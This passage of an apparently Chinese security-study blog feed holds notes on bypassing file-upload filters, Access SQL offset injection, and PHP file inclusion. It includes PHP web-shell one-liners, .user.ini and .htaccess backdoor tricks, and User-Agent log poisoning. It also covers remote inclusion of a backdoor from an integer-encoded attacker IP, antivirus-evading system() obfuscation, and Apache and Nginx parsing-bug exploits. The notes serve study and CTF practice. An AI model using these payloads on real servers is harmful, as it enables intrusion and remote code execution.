      <link href="/2022/02/22/wen-jian-shang-chuan-rao-guo/"/>
      <url>/2022/02/22/wen-jian-shang-chuan-rao-guo/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞-限制绕过"><a href="#文件上传漏洞-限制绕过" class="headerlink" title="文件上传漏洞-限制绕过"></a>文件上传漏洞-限制绕过</h1><h2 id="1、前端javascript验证"><a href="#1、前端javascript验证" class="headerlink" title="1、前端javascript验证"></a>1、前端javascript验证</h2><p>一般只校验后缀名，利用f12可修改前端js代码绕过。</p><h2 id="2、MIME文件类型检测"><a href="#2、MIME文件类型检测" class="headerlink" title="2、MIME文件类型检测"></a>2、MIME文件类型检测</h2><p>修改<strong>content-type</strong>为允许上传类型进行绕过。</p><p>常见MIME类型</p><pre class="line-numbers language-none"><code class="language-none">超文本标记语言文本 .html,.html -&gt;   text&#x2F;htmlJPEG图形 .jpeg,.jpg -&gt;   image&#x2F;jpeg普通文本 .txt -&gt;   text&#x2F;plainGIF图形 .gif -&gt;   image&#x2F;gifPNG图形 .png -&gt;   image&#x2F;png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、-user-ini（php特性）"><a href="#3、-user-ini（php特性）" class="headerlink" title="3、.user.ini（php特性）"></a>3、.user.ini（php特性）</h2><p><strong>php.ini</strong>：php全局配置文件，对整个web服务起作用；而**.user.ini<strong>和</strong>.htaccess<strong>一样是目录的配置文件，</strong>.user.ini<strong>就是</strong>用户自定义的一个php.ini**，我们可以利用这个文件来构造后门和隐藏后门。</p><p>利用方式：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//.user.iniauto_prepend_file=test.png //包含在文件头auto_append_file = test.png            //包含在文件尾（当文件调用的有exit()时该设置无效）// test.png：<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> #补充: .user.ini两条语句有一条即可，类似于文件包含。其中文件会被当作脚本语言进行执行。# .user.ini 实时生效<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用前提：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 服务器脚本语言为PHP</span><span class="token comment"># 服务器使用CGI／FastCGI模式 </span><span class="token comment"># 上传目录下要有可执行的php文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="4、文件内容进行了过滤"><a href="#4、文件内容进行了过滤" class="headerlink" title="4、文件内容进行了过滤"></a>4、文件内容进行了过滤</h2><p><strong>利用php短标签绕过</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span> <span class="token keyword">echo</span> <span class="token string single-quoted-string">'123'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>  #前提是开启配置参数short_open_tags=on<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token punctuation">(</span>表达式<span class="token punctuation">)</span><span class="token delimiter important">?></span></span>  等价于 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token punctuation">(</span>表达式<span class="token punctuation">)</span><span class="token delimiter important">?></span></span> #不需要开启参数设置&lt;% echo '123';%>   #开启配置参数asp_tags=on，并且只能在7.0以下版本使用<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">echo <span class="token string">'123'</span><span class="token punctuation">;</span> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> #不需要修改参数开关，但是只能在7.0以下可用#根据过滤内容更换表达式#例：<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx'</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>#利用system命令执行<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`nl ../f*`</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>#利用反引号``命令执行<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>#利用&#123;&#125;代替[]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>利用日志包含绕过, 图片内容</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">#包含默认日志，日志记录UA头，UA头写后门代码  .user.ini：auto_prepend_file=test.pngtest.png：<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"/var/lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g/nginx/access.lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g"</span><span class="token delimiter important">?></span></span> #因为log被过滤了。所以用拼接绕过#抓包，在UA头中写入木马<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>校验文件头是否为图片格式文件</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"># gif文件头 ->   GIF89A.user.ini：GIF89A auto_prepend_file=test.pngtest.png：GIF89A <span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"/var/lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g/nginx/access.lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g"</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>利用远程包含IP转换地址后门调用执行突破<code>.</code>的过滤</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">.user.ini auto_prepend_file=pngpng <span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string single-quoted-string">'http://2016886???/'</span><span class="token operator">></span><span class="token comment">#服务器中写入后门文件、利用远程包含访问服务器ip、因 ‘.’ 被过滤，需将ip转化为int形式进行包含</span><span class="token comment">#转换地址：https://www.bejson.com/convert/ip2int/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>直接利用.user.ini远程包含突破上传删除</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">auto_prepend_file<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//2016886???/</span><span class="token comment">#当.user.ini可以正常上传，被包含文件上传后被删除时，可利用.user.ini直接包含远程后门进行突破上传</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="5、利用-htaccess绕过"><a href="#5、利用-htaccess绕过" class="headerlink" title="5、利用.htaccess绕过"></a>5、利用.htaccess绕过</h2><ul><li>.htaccess默认不支持nginx，设置后支持</li><li>.htaccess可以通过设置实现文件解析配置将.png后缀的文件解析成php</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#首先上传.htaccess</span>AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token operator">.</span>png   <span class="token comment">#将.png后缀的文件解析 成php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="6、免杀绕过（文件上传）"><a href="#6、免杀绕过（文件上传）" class="headerlink" title="6、免杀绕过（文件上传）"></a>6、免杀绕过（文件上传）</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'syste'</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac ../flagaa.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"s#y#s#t#e#m"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7、上传-日志包含绕过"><a href="#7、上传-日志包含绕过" class="headerlink" title="7、上传-日志包含绕过"></a>7、上传-日志包含绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"># 访问地址，UA头写入后门：<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span># 上传.user.ini包含日志：auto_prepend_file=/var/log/nginx/access.log# 构造.user.ini利用条件：上传index.php 内容随意# 蚁剑连接 index.php就可以了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8、中间件文件解析"><a href="#8、中间件文件解析" class="headerlink" title="8、中间件文件解析"></a>8、中间件文件解析</h2><h3 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a><strong>IIS解析漏洞</strong></h3><ul><li><h4 id="文件解析："><a href="#文件解析：" class="headerlink" title="文件解析："></a>文件解析：</h4></li></ul><pre class="line-numbers language-none"><code class="language-none">x.asp;.x.jpgiis5.x&#x2F;6.0中：文件名分号后不被解析：x.asp;.x.jpg可当作x.asp执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><h4 id="目录解析："><a href="#目录解析：" class="headerlink" title="目录解析："></a>目录解析：</h4></li></ul><pre class="line-numbers language-none"><code class="language-none">iis5.x&#x2F;6.0目录解析：*.asp、*.asa、.cer、.cdx文件夹内任意文件当作asp执行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>上传文件固定文件名、目录无法创建，以上解析漏洞无用武之地。</strong></p><ul><li><h4 id="IIS7-X与Nginx解析漏洞一致"><a href="#IIS7-X与Nginx解析漏洞一致" class="headerlink" title="IIS7.X与Nginx解析漏洞一致"></a>IIS7.X与Nginx解析漏洞一致</h4></li></ul><pre class="line-numbers language-none"><code class="language-none">iis 7.0&amp;7.5 默认Fast-CGI开启，直接在url中图片地址后面输入&#x2F;x.php，会把正常图片当成php解析<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a><strong>Apache解析漏洞</strong></h3><ul><li><h4 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）黑名单绕过"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）黑名单绕过" class="headerlink" title="Apache  HTTPD 换行解析漏洞（CVE-2017-15715）黑名单绕过"></a>Apache  HTTPD 换行解析漏洞（CVE-2017-15715）黑名单绕过</h4></li></ul><p>Apache HTTPD是一款<strong>HTTP服务器</strong>，它可以通过<strong>mod_php</strong>来运行PHP网页。其<strong>2.4.0~2.4.29</strong>版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p>原理：解析漏洞根本原因就是**$** 这个符号，这个符号在<strong>正则表达式</strong>中是<strong>匹配字符串中结尾</strong>的位置，<strong>利用换行符使$ 与其匹配</strong>从而<strong>绕过    黑名单机制</strong>实现文件上传。</p><p>验证逻辑对上传的文件正则匹配验证后缀名是否包含了php，因为解析漏洞的存在，这里<strong>不会过滤php%0a</strong>。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 利用方式：</span>在上传时抓包，在x<span class="token operator">.</span>php （注意：非filename<span class="token operator">=</span>x<span class="token operator">.</span>php）中hex编码的php后一个插入<span class="token number">0</span>A。<span class="token comment"># 修改十六进制代码，可在php后加一个空格，将空格的十六进制20修改为0A</span>上传成功访问ip<span class="token operator">/</span>x<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">0</span>A页面回显出php的相关信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><h4 id="Apache-HTTPD-未知后缀解析漏洞"><a href="#Apache-HTTPD-未知后缀解析漏洞" class="headerlink" title="Apache HTTPD 未知后缀解析漏洞"></a>Apache HTTPD 未知后缀解析漏洞</h4></li></ul><!--该漏洞与版本无关、属于用户配置不当造成的解析漏洞。--><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">AddHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token operator">.</span>php  <span class="token comment"># 解释：让Apache把PHP文件交给php_moudle解析，但是它与sethandler的区别是它的后缀不是用正则去匹配。所以在文件名的任何位置匹配到php，他都会让php_module解析</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过<strong>上传白名单</strong>的解析漏洞。</p><p><strong>补充：利用此方法文件名需要基于本地上传为准</strong></p><h3 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h3><ul><li><h4 id="解析漏洞-nginx-conf配置不当"><a href="#解析漏洞-nginx-conf配置不当" class="headerlink" title="解析漏洞-nginx.conf配置不当"></a>解析漏洞-nginx.conf配置不当</h4></li></ul><p><em><strong>该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞</strong></em></p><p>在访问的文件后增加<code>/.php</code>后缀，被解析成PHP文件：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;uploadfiles&#x2F;nginx.png&#x2F;.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><h4 id="Nginx-文件名逻辑漏洞（CVE-2013-4547）"><a href="#Nginx-文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="Nginx 文件名逻辑漏洞（CVE-2013-4547）"></a>Nginx 文件名逻辑漏洞（CVE-2013-4547）</h4></li></ul><p><strong>影响版本：</strong>Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p><p>这个漏洞和代码执行没有太大关系，其主要原因是<strong>错误地解析了请求的URI</strong>，<strong>错误地获取到用户请求的文件名</strong>，导致出现权限绕过、代码执行的连带影响。</p><p><strong>利用方式：</strong></p><pre class="line-numbers language-none"><code class="language-none">1、我们上传一个“1.gif ”，注意后面的空格。1.gif: &lt;?php phpinfo();?&gt;2、访问http:&#x2F;&#x2F;ip:8080&#x2F;uploadfiles&#x2F;1.gif[0x20][0x00].php，即可发现PHP已被解析。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL</title>
      <link href="/2022/01/21/sql/"/>
      <url>/2022/01/21/sql/</url>
      
        <content type="html"><![CDATA[<h2 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h2><p><strong>Access 数据库了解：</strong></p><ul><li>Access数据库属于文件型数据库，所以不需要端口号。</li><li>Access数据库中没有注释符号.因此 /**/  、 –  和  #  都没法使用。</li><li>Access 结构：<strong>表名—-&gt;列名—-&gt;内容数据</strong> ；无数据库的概念，所有的表都是在同一个数据库下。因此不用去判断当前的数据库名，也不存在 database() 函数。</li><li>Access数据库特有的表是：<strong>msysobjects</strong> ，所以可以用它来判断是否是Access数据库</li></ul><p><strong>Access 注入：</strong></p><ul><li>联合查询：只能靠猜和借助字典得到数据。先用order by判断<strong>字段</strong>的长度，然后联合查询表，回显正常即为表存在，反之为不存在。</li><li>偏移注入：<!--此种方法比较靠运气，可做了解）--></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#适用于在Accesss数据库中已知表名，无法获取字段的SQL注入。</span><span class="token comment"># 例：已知：表admin</span><span class="token comment">#1、order by 判断字段的长度</span><span class="token comment">#2、我们用*代替admin表内存在的字段，从最后一个字段开始，逐步缩减字段数,直到页面返回正常。</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span> <span class="token keyword">from</span> admin<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token comment">#错误</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token comment">#错误</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">#错误</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token comment">#正常</span><span class="token comment">#此时说明表admin下有6个字段（22-16=6）</span><span class="token comment">#一级偏移语句：22-6x2=10</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span>admin <span class="token keyword">as</span> a <span class="token keyword">inner</span> <span class="token keyword">join</span> admin <span class="token keyword">as</span> b <span class="token keyword">on</span> a<span class="token punctuation">.</span>id<span class="token operator">=</span>b<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token comment">#此时可以查看页面是否爆出我们需要的数据，如果没有的话可以查看源代码，若源代码也没有。。。那么</span><span class="token comment">#二级偏移语句：22-6x3=4</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>id<span class="token punctuation">,</span>b<span class="token punctuation">.</span>id<span class="token punctuation">,</span>c<span class="token punctuation">.</span>id<span class="token punctuation">,</span><span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>admin <span class="token keyword">as</span> a <span class="token keyword">inner</span> <span class="token keyword">join</span> admin <span class="token keyword">as</span> b <span class="token keyword">on</span> a<span class="token punctuation">.</span>id <span class="token operator">=</span> b<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token keyword">inner</span> <span class="token keyword">join</span> admin <span class="token keyword">as</span> c <span class="token keyword">on</span> a<span class="token punctuation">.</span>id<span class="token operator">=</span>c<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞介绍</title>
      <link href="/2022/01/15/wen-jian-bao-han/"/>
      <url>/2022/01/15/wen-jian-bao-han/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>​    大多数web语言（php、java等）可以提供文件包含的操作，以php为例：服务器执行php文件时，可以通过文件包含函数加载另一个文件中的php代码，并且当php来执行。</p><ul><li><strong>注：其他语言也可能出现包含漏洞</strong></li></ul><h2 id="文件包含函数-PHP"><a href="#文件包含函数-PHP" class="headerlink" title="文件包含函数-PHP"></a>文件包含函数-PHP</h2><table><thead><tr><th>php函数：</th><th>解析：</th></tr></thead><tbody><tr><td>Include</td><td>执行到include时才包含文件，找不到被包含文件时产生警告，脚本继续执行</td></tr><tr><td>Include_once</td><td>与Include()语句类似，区别是若文件已被包涵则不会再次包含。</td></tr><tr><td>Require</td><td>程序一运行就包含文件，找不到被包含的文件时产生致命错误，并停止脚本</td></tr><tr><td>Require_once</td><td>与Require()语句类似，区别是若文件已被包涵则不会再次包含。</td></tr></tbody></table><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><h4 id="漏洞示例：（无限制）"><a href="#漏洞示例：（无限制）" class="headerlink" title="漏洞示例：（无限制）"></a>漏洞示例：（无限制）</h4><p>在index.php中有如下代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​    在提交url时，当在url中取得filename参数的值时，include直接包含了这个文件。如：</p><p><code>http://www.xxx.com/index.php?filname=xxx.php</code></p><p>​    若xxx.php为已存在敏感文件，则会造成一些敏感信息泄露的问题。若xxx.php文件为用户可控（结合文件上传），则会造成严重危害。若xxx.php文件不存在，通常会产生报错信息，从而可能会泄露网站的绝对路径，造成安全隐患。</p><h4 id="漏洞示例：（有限制）"><a href="#漏洞示例：（有限制）" class="headerlink" title="漏洞示例：（有限制）"></a>漏洞示例：（有限制）</h4><p>核心代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>与上述漏洞不同的是，服务端将所包含文件加后缀<code>.html</code>强制转换成html类型去执行。</p><p>绕过方法：</p><p>​    windows文件命名不超过256个字符，可使用<code>./</code>进行垃圾字符填充，使.html没有空间写入文件名中。</p><p>长度截断：windows,点号长于256，linux长于4096</p><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>​    在php语言中，若使用远程文件包含，首先确定php是否开启远程文件包含功能：allow_url_include = On</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">allow_url_fopen <span class="token operator">=</span> <span class="token function">On</span> <span class="token punctuation">(</span>允许打开<span class="token constant">URL</span>文件<span class="token punctuation">)</span><span class="token comment">//默认开启</span>allow_url_fopen <span class="token operator">=</span> <span class="token function">Off</span> <span class="token punctuation">(</span>禁止打开<span class="token constant">URL</span>文件<span class="token punctuation">)</span>allow_url_include <span class="token operator">=</span> <span class="token function">Off</span> <span class="token punctuation">(</span>禁止引用<span class="token constant">URL</span>文件<span class="token punctuation">)</span><span class="token comment">//php 5.2以后添加,安全方便的设置(默认关闭)</span>allow_url_include <span class="token operator">=</span> <span class="token function">On</span> <span class="token punctuation">(</span>允许引用<span class="token constant">URL</span>文件<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用："><a href="#利用：" 